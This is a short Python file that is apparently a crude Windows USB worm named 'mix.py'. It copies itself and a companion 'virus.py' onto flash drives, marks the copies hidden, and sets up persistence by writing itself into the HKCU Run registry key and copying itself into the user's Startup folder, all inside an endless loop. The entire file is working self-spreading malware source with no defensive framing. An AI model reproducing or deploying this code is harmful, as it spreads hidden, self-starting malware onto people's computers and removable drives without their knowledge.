import shutil
import ctypes
import winreg as reg
import time
import os

flash = ['i:','g:']
user = os.getlogin()
timer = 0
while True:
    time.sleep(3)
    pwd = os.getcwd()
    timer += 1
# those code it's for move mix.py to registry windows
    pth = os.path.dirname(os.path.realpath(__file__))  
    s_name="mix.py" 
    address=os.path.join(pth,s_name) 
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS) 
    reg.SetValueEx(open,"any_name",0,reg.REG_SZ,address) 
    reg.CloseKey(open)
    
    if pwd == 'F:\\': #1 
        for x in flash :
            try:
                cp_virus = shutil.copy('virus.py',x)# it's for copy virus to flash
                cp_mix = shutil.copy('mix.py',x) #it's for copy mix to flash
                ctypes.windll.kernel32.SetFileAttributesW(x +'mix.py',2) # it's for select the permision (hidden)
                ctypes.windll.kernel32.SetFileAttributesW(x +'virus.py',2)
                print('hidden sucsessful')
                print('run 1  ')
            except:
                print('error 1')
                pass
        
    elif pwd == 'I:\\': #2
        try:
            cp_virus = shutil.copy('virus.py','f:')
            cp_mix = shutil.copy('mix.py','f:')
            cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
            print('run 2')
        except:
            print('error 2')
            pass
        
    elif pwd == 'g:\\': #4
        try:
            cp_virus = shutil.copy('virus.py','f:')
            cp_mix = shutil.copy('mix.py','f:')
            cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
            print('run 4')
        except:
            print('error 4')
            pass
    #3   
    elif pwd == 'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'% user :
        try:
            #cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
            print('run 3')
        except:
            print('error 3')
            pass

    else:
        print('error x400')
        print('...>> ',timer)
